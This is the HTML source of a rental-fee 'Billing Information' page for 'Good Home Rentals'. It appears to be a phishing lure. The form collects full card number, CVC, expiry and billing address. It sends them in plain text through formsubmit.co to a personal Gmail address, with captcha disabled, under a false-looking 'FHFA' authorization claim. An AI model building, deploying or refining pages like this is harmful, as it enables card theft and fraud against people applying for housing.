<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Billing Information - Good Home Rentals</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      min-height: 100vh;
      background: url('https://source.unsplash.com/random/1600x900/?house') no-repeat center/cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }

    header {
      position: sticky;
      top: 0;
      background: #1a3c34;
      padding: 15px;
      width: 100%;
      z-index: 1000;
    }

    nav ul {
      list-style: none;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    nav a {
      color: white;
      text-decoration: none;
      font-size: 1.1rem;
      font-weight: 400;
      transition: color 0.3s ease;
    }

    nav a:hover {
      color: #4CAF50;
    }

    .hero {
      text-align: center;
      padding: 40px 20px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      max-width: 800px;
      width: 100%;
      margin: 20px 0;
    }

    h1 {
      color: #1a3c34;
      font-size: 2.5rem;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .form-container {
      background: white;
      border-radius: 10px;
      padding: 20px;
      margin: 15px 0;
      width: 100%;
      max-width: 600px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    h2 {
      color: #1a3c34;
      font-size: 1.5rem;
      font-weight: 400;
      margin-bottom: 15px;
    }

    label {
      display: block;
      color: #4a6360;
      font-size: 0.9rem;
      font-weight: 400;
      margin-bottom: 5px;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1rem;
      font-family: 'Poppins', sans-serif;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 15px;
    }

    button {
      font-size: 1.1rem;
      font-weight: 400;
      padding: 12px 30px;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, #4CAF50, #2e7d32);
      color: white;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: background 0.3s ease, transform 0.2s ease;
    }

    button:hover {
      background: linear-gradient(90deg, #45a049, #27632a);
      transform: scale(1.05);
    }

    button:active {
      transform: scale(0.95);
    }

    footer {
      margin-top: 40px;
      font-size: 0.9rem;
      color: #4a6360;
      padding: 15px;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 10px;
      width: 100%;
      text-align: center;
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 1.8rem;
      }

      .form-container {
        padding: 15px;
      }

      button {
        font-size: 1rem;
        padding: 10px 20px;
      }

      nav ul {
        flex-direction: column;
        gap: 10px;
      }
    }
  </style>
</head>
<body>
  <header>
    <nav>
      <ul>
        <li><a href="index.html">Home</a></li>
        <li><a href="application.html">Apply</a></li>
        <li><a href="payment-choice.html">Pay</a></li>
        <li><a href="contact.html">Contact</a></li>
      </ul>
    </nav>
  </header>

  <div class="hero">
    <h1>Billing Information</h1>
  </div>

  <div class="form-container">
    <h2>Enter Your Billing Details</h2>
    
    <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST"> 
      
      <label for="full-name">Full Name</label>
      <input type="text" id="full-name" name="full-name" required>

      <label for="card-number">Card Number</label>
      <input type="text" id="card-number" name="card-number" pattern="\d{4}-\d{4}-\d{4}-\d{4}" placeholder="XXXX-XXXX-XXXX-XXXX" required>

      <label for="cvc">CVC</label>
      <input type="text" id="cvc" name="cvc" pattern="\d{3,4}" placeholder="XXX" required>

      <label for="expiry-date">Expiry Date</label>
      <input type="text" id="expiry-date" name="expiry-date" pattern="\d{2}/\d{2}" placeholder="MM/YY" required>

      <label for="billing-address">Billing Address</label>
      <input type="text" id="billing-address" name="billing-address" required>

      <label for="total-amount">Total Amount</label>
      <input type="text" id="total-amount" name="total-amount" value="$75" readonly>

      <div class="checkbox-group">
        <input type="checkbox" id="authorization" name="authorization" required>
        <label for="authorization">I accept the authorization given to Good Homes by FHFA to charge the amount for my rental application.</label>
      </div>

      <input type="hidden" name="_captcha" value="false">  
      <input type="hidden" name="_template" value="table">  
      <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/thank-you.html"> 

      <button type="submit"><i class="fas fa-paper-plane"></i> Submit Billing Info</button>
    </form>
  </div>

  <footer>Â© 2025 Good Home Rentals. All rights reserved.</footer>
</body>
</html>
